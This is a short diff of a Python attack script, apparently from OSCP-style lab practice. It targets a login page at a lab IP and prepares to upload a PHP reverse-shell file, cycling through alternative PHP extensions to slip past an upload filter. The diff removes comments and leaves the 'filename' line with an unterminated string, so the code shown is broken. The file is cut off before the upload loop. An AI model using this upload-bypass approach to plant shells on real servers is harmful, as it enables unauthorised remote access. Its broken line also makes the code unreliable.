@@ -1,16 +1,15 @@
 #!/usr/bin/env python
 
-import requests #which library is this?
-import os # which library is this
+import requests 
+import os
 
-#import OS
 ip = "10.10.83.93"
 url = f"http://{ip}:3333/internal/index.php" #login page
 
-old_filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell.php" #why is this needed
+old_filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell.php" 
 
 # requests to upload a file
-filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell"		#
+filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell
 extensions = [
 	".php",
 	".php3",
